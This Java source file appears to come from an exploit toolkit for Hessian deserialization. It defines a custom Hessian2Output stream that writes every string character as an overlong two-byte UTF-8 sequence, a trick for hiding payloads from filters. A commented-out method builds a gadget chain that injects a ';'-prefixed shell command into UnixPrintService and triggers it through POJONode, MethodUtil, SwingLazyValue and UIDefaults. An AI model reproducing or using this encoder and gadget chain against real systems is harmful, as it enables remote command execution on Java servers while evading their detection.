package util.customOutputStream;

import com.caucho.hessian.io.Hessian2Output;
import com.fasterxml.jackson.databind.node.POJONode;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;

public class HessianCustomObjectOutputStream extends Hessian2Output {

    private int _offset;

    private final byte[] _buffer = new byte[SIZE];

    public HessianCustomObjectOutputStream(OutputStream os) {
        super(os);
    }

    @Override
    public void printString(String v, int strOffset, int length)
            throws IOException {

        int offset = _offset;
        byte[] buffer = _buffer;

        for (int i = 0; i < length; i++) {
            if (SIZE <= offset + 16) {
                _offset = offset;
                flushBuffer();
                offset = _offset;
            }
            char ch = v.charAt(i + strOffset);


            //2 bytes UTF-8
            buffer[offset++] = (byte) (0xc0 + (convert(ch)[0] & 0x1f));
            buffer[offset++] = (byte) (0x80 + (convert(ch)[1] & 0x3f));
        }
        _offset = offset;
    }


    @Override
    public void printString(char[] v, int strOffset, int length)
            throws IOException {
        int offset = _offset;
        byte[] buffer = _buffer;

        for (int i = 0; i < length; i++) {
            if (SIZE <= offset + 16) {
                _offset = offset;
                flushBuffer();
                offset = _offset;
            }

            char ch = v[i + strOffset];
            buffer[offset++] = (byte) (0xc0 + (convert(ch)[0] & 0x1f));
            buffer[offset++] = (byte) (0x80 + (convert(ch)[1] & 0x3f));
            _offset = offset;
        }

    }
    public int[] convert ( int i){
        int b1 = ((i >> 6) & 0b11111) | 0b11000000;
        int b2 = (i & 0b111111) | 0b10000000;
        return new int[]{b1, b2};
    }


//    public static HashMap getUnixPrintServicePayload(String command) throws Exception {
//        Constructor constructor = UnixPrintService.class.getDeclaredConstructor(String.class);
//        constructor.setAccessible(true);
//        UnixPrintService unixPrintService = (UnixPrintService) constructor.newInstance(";" + command);
//
//        POJONode pojoNode = new POJONode(unixPrintService);
//
//        Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
//        Method exec = String.class.getDeclaredMethod("valueOf", Object.class);
//        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, new String("123"), new Object[]{pojoNode}}});
//
//        UIDefaults u1 = new UIDefaults();
//        UIDefaults u2 = new UIDefaults();
//        u1.put("aaa", swingLazyValue);
//        u2.put("aaa", swingLazyValue);
//
//        return makeMap(u1, u2);
//    }
}